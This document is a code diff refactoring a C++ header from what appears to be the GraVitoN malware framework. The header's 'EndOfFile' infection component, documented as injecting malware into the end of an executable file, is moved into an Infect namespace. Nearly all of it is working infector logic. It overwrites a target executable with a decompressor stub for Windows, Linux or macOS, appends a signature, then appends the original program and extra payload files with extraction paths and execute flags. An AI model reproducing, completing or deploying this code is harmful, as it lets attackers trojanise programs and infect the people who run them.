@@ -24,11 +24,12 @@
  *
 */
 
-#ifndef _GVN_SPREAD_ENDOFFILE_HEAD_
-#define _GVN_SPREAD_ENDOFFILE_HEAD_
+#ifndef _GVN_ENDOFFILE_HEAD_
+#define _GVN_ENDOFFILE_HEAD_
 
-#include "../../gvn_utils/gvn_files.hpp"
-#include "../gvn_spread.hpp"
+#include <utils/files.hpp>
+#include <infect/infect.hpp>
+#include <utils/optparser.hpp>
 #include <cstdio>
 #include <vector>
 #include <cstdlib>
@@ -36,29 +37,19 @@
 #include <cstring>
 #include <sstream>
 
-#include "gvn_spread_endoffile_decom_win32.hpp"
-#include "gvn_spread_endoffile_decom_linux64.hpp"
-#include "gvn_spread_endoffile_decom_osx32.hpp"
+#include "endoffile_decom_win32.hpp"
+#include "endoffile_decom_linux64.hpp"
+#include "endoffile_decom_osx32.hpp"
 
 using namespace std;
 
-int SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE = 256;
-unsigned char *SPREAD_ENDOFFILE_EOF_SIGNATURE;
-
-void generateSignature()
+namespace GraVitoN
 {
-    SPREAD_ENDOFFILE_EOF_SIGNATURE = new unsigned char[SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE];
-    unsigned char sig = 0xCE;
-    for ( int i=0; i<SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE; ++i )
-    {
-        SPREAD_ENDOFFILE_EOF_SIGNATURE[i] = sig;
 
-        /// 79 is a prime number!
-        sig = ( ~sig % 79 + ( sig << 8 ) % 79 + ( sig >> 8 ) % 79 ) % 0xFF;
-    }
-}
+namespace Infect
+{
 
-
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
  * @brief Inject malware to end of an executable file
  *
@@ -90,8 +81,27 @@ void generateSignature()
  * Do Not Forget Last '\': DecFilePath1=[C:\windows\]
  */
 
-class Spread_EndOfFile : public GraVitoN::Spread
+class EndOfFile : public Infect::Infect_Component
 {
+protected:
+    string options;
+
+public:
+    static size_t ENDOFFILE_EOF_SIGNATURE_SIZE;
+    static unsigned char *ENDOFFILE_EOF_SIGNATURE;
+
+    static void generateSignature()
+    {
+        ENDOFFILE_EOF_SIGNATURE = new unsigned char[ENDOFFILE_EOF_SIGNATURE_SIZE];
+        unsigned char sig = 0xCE;
+        for (size_t i=0; i<ENDOFFILE_EOF_SIGNATURE_SIZE; ++i )
+        {
+            ENDOFFILE_EOF_SIGNATURE[i] = sig;
+
+            /// 79 is a prime number!
+            sig = ( ~sig % 79 + ( sig << 8 ) % 79 + ( sig >> 8 ) % 79 ) % 0xFF;
+        }
+    }
 protected:
     unsigned char *decom;
     unsigned int decom_size;
@@ -119,23 +129,30 @@ protected:
                                const bool   &execute );
 
 public:
-    Spread_EndOfFile();
-    virtual ~Spread_EndOfFile();
+    EndOfFile();
+    virtual ~EndOfFile();
 
     virtual bool initialize ( const string &_options = "" );
     virtual bool run();
 };
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
+/// Static reference
+size_t EndOfFile::ENDOFFILE_EOF_SIGNATURE_SIZE = 256;
+unsigned char *EndOfFile::ENDOFFILE_EOF_SIGNATURE;
 
-Spread_EndOfFile::Spread_EndOfFile()
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
+EndOfFile::EndOfFile()
 {
     generateSignature();
 }
 
-Spread_EndOfFile::~Spread_EndOfFile()
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
+EndOfFile::~EndOfFile()
 {
 }
 
-bool Spread_EndOfFile::initialize ( const string &_options )
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
+bool EndOfFile::initialize ( const string &_options )
 {
     options = _options;
     file_path.clear();
@@ -147,11 +164,11 @@ bool Spread_EndOfFile::initialize ( const string &_options )
     string sval;
     bool bval;
     int ival;
-    if ( !GraVitoN::OptParser::getValueAsString ( options, "Decom", sval, true ) )
+    if ( !GraVitoN::Utils::OptParser::getValueAsString ( options, "Decom", sval, true ) )
     {
         return false;
     }
-    GraVitoN::Logger::logVariable ( "Decom", sval );
+    GraVitoN::Core::Logger::logVariable ( "Decom", sval );
 
     if ( sval == "win32" )
     {
@@ -173,29 +190,29 @@ bool Spread_EndOfFile::initialize ( const string &_options )
         return false;
     }
 
-    if ( !GraVitoN::OptParser::getValueAsString ( options, "Target", target ) )
+    if ( !GraVitoN::Utils::OptParser::getValueAsString ( options, "Target", target ) )
     {
         return false;
     }
-    GraVitoN::Logger::logVariable ( "Target", target );
+    GraVitoN::Core::Logger::logVariable ( "Target", target );
 
-    if ( !GraVitoN::OptParser::getValueAsString ( options, "DecTarget", dec_targ ) )
+    if ( !GraVitoN::Utils::OptParser::getValueAsString ( options, "DecTarget", dec_targ ) )
     {
         return false;
     }
-    GraVitoN::Logger::logVariable ( "DecTarget", dec_targ );
+    GraVitoN::Core::Logger::logVariable ( "DecTarget", dec_targ );
 
-    if ( !GraVitoN::OptParser::getValueAsString ( options, "DecTargetPath", dec_targ_path ) )
+    if ( !GraVitoN::Utils::OptParser::getValueAsString ( options, "DecTargetPath", dec_targ_path ) )
     {
         return false;
     }
-    GraVitoN::Logger::logVariable ( "DecTargetPath", dec_targ_path );
+    GraVitoN::Core::Logger::logVariable ( "DecTargetPath", dec_targ_path );
 
-    if ( !GraVitoN::OptParser::getValueAsInt ( options, "NumFiles", ival ) )
+    if ( !GraVitoN::Utils::OptParser::getValueAsInt ( options, "NumFiles", ival ) )
     {
         return false;
     }
-    GraVitoN::Logger::logVariable ( "NumFiles", ival );
+    GraVitoN::Core::Logger::logVariable ( "NumFiles", ival );
 
     for ( int i=1; i<=ival; ++i )
     {
@@ -206,44 +223,45 @@ bool Spread_EndOfFile::initialize ( const string &_options )
 
         entity = "File";
         entity = entity + si;
-        if ( !GraVitoN::OptParser::getValueAsString ( options, entity, sval ) )
+        if ( !GraVitoN::Utils::OptParser::getValueAsString ( options, entity, sval ) )
         {
             return false;
         }
         file_path.push_back ( sval );
-        GraVitoN::Logger::logVariable ( entity, sval );
+        GraVitoN::Core::Logger::logVariable ( entity, sval );
 
         entity = "DecFile";
         entity = entity + si;
-        if ( !GraVitoN::OptParser::getValueAsString ( options, entity, sval ) )
+        if ( !GraVitoN::Utils::OptParser::getValueAsString ( options, entity, sval ) )
         {
             return false;
         }
         dec_name.push_back ( sval );
-        GraVitoN::Logger::logVariable ( entity, sval );
+        GraVitoN::Core::Logger::logVariable ( entity, sval );
 
         entity = "DecFilePath" + si;
-        if ( !GraVitoN::OptParser::getValueAsString ( options, entity, sval ) )
+        if ( !GraVitoN::Utils::OptParser::getValueAsString ( options, entity, sval ) )
         {
             return false;
         }
         dec_path.push_back ( sval );
-        GraVitoN::Logger::logVariable ( entity, sval );
+        GraVitoN::Core::Logger::logVariable ( entity, sval );
 
         entity = "IsExec";
         entity = entity + si;
-        if ( !GraVitoN::OptParser::getValueAsBool ( options, entity, bval ) )
+        if ( !GraVitoN::Utils::OptParser::getValueAsBool ( options, entity, bval ) )
         {
             return false;
         }
         is_exec.push_back ( bval );
-        GraVitoN::Logger::logVariable ( entity, bval );
+        GraVitoN::Core::Logger::logVariable ( entity, bval );
     }
 
     return true;
 }
 
-bool Spread_EndOfFile::_InjectFile ( const unsigned char *content,
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
+bool EndOfFile::_InjectFile ( const unsigned char *content,
                                     const unsigned int &size,
                                     const string &decom_address,
                                     const string &extract_name,
@@ -262,41 +280,42 @@ bool Spread_EndOfFile::_InjectFile ( const unsigned char *content,
     itmp = 0;
     cout<<"Name: "<<extract_name<<", Size: "<<extract_name.size() <<endl;
     memcpy ( ctmp, & ( itmp = extract_name.size() ), 2 ); ///< Size of graviton name
-    GraVitoN::File::saveUChars ( decom_address, ctmp, 2, true );
+    GraVitoN::Utils::File::saveUChars ( decom_address, ctmp, 2, true );
 
     /// Add File Name
-    GraVitoN::File::saveUChars ( decom_address, ( unsigned char * ) extract_name.c_str(), extract_name.size(), true );
+    GraVitoN::Utils::File::saveUChars ( decom_address, ( unsigned char * ) extract_name.c_str(), extract_name.size(), true );
 
     /// Add extraction path size
     cout<<"ExtPath: "<<extract_path<<", Size: "<<extract_path.size() <<endl;
     memcpy ( ctmp, & ( itmp = extract_path.size() ), 2 ); ///< Size of extraction path
-    GraVitoN::File::saveUChars ( decom_address, ctmp, 2, true );
+    GraVitoN::Utils::File::saveUChars ( decom_address, ctmp, 2, true );
 
     /// Add Extract Path
-    GraVitoN::File::saveUChars ( decom_address, ( unsigned char * ) extract_path.c_str(), extract_path.size(), true );
+    GraVitoN::Utils::File::saveUChars ( decom_address, ( unsigned char * ) extract_path.c_str(), extract_path.size(), true );
 
     /// Set execution flag
     itmp = ( execute ) ?1:0;
     memcpy ( ctmp, &itmp, 1 );
-    GraVitoN::File::saveUChars ( decom_address, ctmp, 1, true );
+    GraVitoN::Utils::File::saveUChars ( decom_address, ctmp, 1, true );
 
     cout<<"File Size: "<<size<<endl;
     memcpy ( dtmp, &size, 4 ); ///< Size of file
-    GraVitoN::File::saveUChars ( decom_address, dtmp, 4, true );
+    GraVitoN::Utils::File::saveUChars ( decom_address, dtmp, 4, true );
 
-    GraVitoN::File::saveUChars ( decom_address, content, size, true ); ///< Add File
+    GraVitoN::Utils::File::saveUChars ( decom_address, content, size, true ); ///< Add File
 
     return true;
 }
 
-bool Spread_EndOfFile::addFile ( const string &decom_address,
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
+bool EndOfFile::addFile ( const string &decom_address,
 								const string &file_address,     
                                 const string &extract_name,
                                 const string &extract_path,
                                 const bool   &execute )
 {
     unsigned char *content = _null_;
-    unsigned long size = GraVitoN::File::loadFile ( file_address, &content );
+    unsigned long size = GraVitoN::Utils::File::loadFile ( file_address, &content );
 
     if ( size == 0 && content == NULL )
     {
@@ -306,24 +325,25 @@ bool Spread_EndOfFile::addFile ( const string &decom_address,
     return _InjectFile ( content, size, decom_address, extract_name, extract_path, execute );
 }
 
-bool Spread_EndOfFile::run()
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
+bool EndOfFile::run()
 {
     unsigned char ctmp[2];
     unsigned long itmp = 0;
 
     unsigned char *content = _null_;
-    unsigned long size = GraVitoN::File::loadFile ( target, &content );
+    unsigned long size = GraVitoN::Utils::File::loadFile ( target, &content );
 
     /// Extract Decompressor Payload
-    GraVitoN::File::saveUChars ( target, decom, decom_size );
+    GraVitoN::Utils::File::saveUChars ( target, decom, decom_size );
 
     /// Add sign1ature
-    GraVitoN::File::saveUChars ( target, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true );
+    GraVitoN::Utils::File::saveUChars ( target, ENDOFFILE_EOF_SIGNATURE, ENDOFFILE_EOF_SIGNATURE_SIZE, true );
 
     /// Add number of files
     itmp = file_path.size() + 1;
     memcpy ( ctmp, &itmp, 2 );
-    GraVitoN::File::saveUChars ( target, ctmp, 2, true );
+    GraVitoN::Utils::File::saveUChars ( target, ctmp, 2, true );
 
     /// Add attributes
     if ( !_InjectFile ( content, size, target, dec_targ, dec_targ_path, true ) )
@@ -346,15 +366,15 @@ bool Spread_EndOfFile::run()
     unsigned long itmp = 0;
 
     /// Extract Decompressor Payload
-    GraVitoN::File::saveUChars(decom_addr, DECOM_EOF_OSX32, DECOM_EOF_OSX32_SIZE);
+    GraVitoN::Utils::File::saveUChars(decom_addr, DECOM_EOF_OSX32, DECOM_EOF_OSX32_SIZE);
 
     /// Add sign1ature
-    GraVitoN::File::saveUChars(decom_addr, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true);
+    GraVitoN::Utils::File::saveUChars(decom_addr, ENDOFFILE_EOF_SIGNATURE, ENDOFFILE_EOF_SIGNATURE_SIZE, true);
 
     /// Add number of files
     itmp = 2;
     memcpy(ctmp, &itmp, 2);
-    GraVitoN::File::saveUChars(decom_addr, ctmp, 2, true);
+    GraVitoN::Utils::File::saveUChars(decom_addr, ctmp, 2, true);
 
     /// Add attributes
     /// A: GraVitoN
@@ -373,10 +393,10 @@ bool Spread_EndOfFile::run()
     unsigned long itmp = 0;
 
     /// Extract Decompressor Payload
-    GraVitoN::File::saveUChars(decom_addr, DECOM_EOF_LINUX64, DECOM_EOF_LINUX64_SIZE);
+    GraVitoN::Utils::File::saveUChars(decom_addr, DECOM_EOF_LINUX64, DECOM_EOF_LINUX64_SIZE);
 
     /// Add sign1ature
-    GraVitoN::File::saveUChars(decom_addr, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true);
+    GraVitoN::Utils::File::saveUChars(decom_addr, ENDOFFILE_EOF_SIGNATURE, ENDOFFILE_EOF_SIGNATURE_SIZE, true);
 
     /// Add number of files
     itmp = 2;
@@ -399,13 +419,13 @@ bool Spread_EndOfFile::run()
     unsigned char ctmp[2];
     unsigned long itmp = 0;
     /// Extract Decompressor Payload
-    GraVitoN::File::saveUChars(decom_addr, DECOM_EOF_WIN32, DECOM_EOF_WIN32_SIZE);
+    GraVitoN::Utils::File::saveUChars(decom_addr, DECOM_EOF_WIN32, DECOM_EOF_WIN32_SIZE);
     /// Add sign1ature
-    GraVitoN::File::saveUChars(decom_addr, SPREAD_ENDOFFILE_EOF_SIGNATURE, SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE, true);
+    GraVitoN::Utils::File::saveUChars(decom_addr, ENDOFFILE_EOF_SIGNATURE, ENDOFFILE_EOF_SIGNATURE_SIZE, true);
     /// Add number of files
     itmp = 2;
     memcpy(ctmp, &itmp, 2);
-    GraVitoN::File::saveUChars(decom_addr, ctmp, 2, true);
+    GraVitoN::Utils::File::saveUChars(decom_addr, ctmp, 2, true);
 
     /// Add attributes
     /// A: GraVitoN
@@ -417,4 +437,6 @@ bool Spread_EndOfFile::run()
     */
 }
 
-#endif // _GVN_SPREAD_ENDOFFILE_HEAD_
+}
+}
+#endif // _GVN_ENDOFFILE_HEAD_
